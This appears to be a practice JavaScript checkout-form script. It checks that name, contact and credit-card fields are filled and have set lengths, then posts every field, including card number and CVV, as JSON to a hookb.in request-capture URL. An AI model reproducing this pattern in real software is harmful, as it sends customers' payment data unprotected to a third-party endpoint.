const form = document.getElementById('form')
const firstName = document.getElementById('firstName')
const lastName = document.getElementById('lastName')
const mail = document.getElementById('mail')
const postalCode = document.getElementById('postalCode')
const phone = document.getElementById('phone')
const creditCard = document.getElementById('creditCard')
const securityCode = document.getElementById('securityCode')
const expirationDate = document.getElementById('expirationDate')
const error = document.getElementById('error')
const secondError = document.getElementById('secondError')
const url = "https://hookb.in/ggpGzZJYRZuG7Voo7xPp";
form.addEventListener('submit', (e) => {
    const formData = new FormData(form)
    const formDataSerialized = Object.fromEntries(formData)
    const jsonObject = {formDataSerialized}
    e.preventDefault()
    let messages = 0
    let errorMessage = []
    let secondErrorMessage = []
    error.innerText = ''
    secondError.innerText = ''
    if (firstName.value === '' || firstName.value == null){
        messages += 1;
    }
    if (lastName.value === '' || lastName.value == null){
        messages += 1;
    }
    if (mail.value === '' || mail.value == null){
        messages += 1;
    }
    if (postalCode.value === '' || postalCode.value == null){
        messages += 1;
    }
    if (phone.value === '' || phone.value == null){
        messages += 1;
    }
    if (creditCard.value === '' || creditCard.value == null){
        messages += 1;
    }
    if (securityCode.value === '' || securityCode.value == null){
        messages += 1;
    }
    if (expirationDate.value === '' || expirationDate.value == null){
        messages += 1;
    }
    if (postalCode.value.length != 5) {
        secondErrorMessage.push('\n* Postal code should have 5 symbols')
    }
    if (phone.value.length != 9) {
        secondErrorMessage.push('\n* Phone number should have 9 symbols')
    }
    if (creditCard.value.length != 16) {
        secondErrorMessage.push('\n* Credit card number should have 16 symbols')
    }
    if (securityCode.value.length != 3) {
        secondErrorMessage.push('\n* CVV number should have 3 symbols')
    }
    if (expirationDate.value.length != 5) {
        secondErrorMessage.push('\n* Expiration date should have 5 symbols, 00/00 format')
    }

    if (messages > 0) {
        errorMessage.push('* Check if every field is filled in')
        error.innerText = errorMessage.join(', ')
    }
    if (secondErrorMessage.length > 0) {
        secondError.innerText = secondErrorMessage.join(', ')
    }
    else {
        var xhr = new XMLHttpRequest();

xhr.open("POST", "https://hookb.in/ggpGzZJYRZuG7Voo7xPp", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");

xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console.log("done.");
        alert('Your data was successfully send')
    }
};


var data = JSON.stringify(jsonObject);

xhr.send(data);
    }
    
})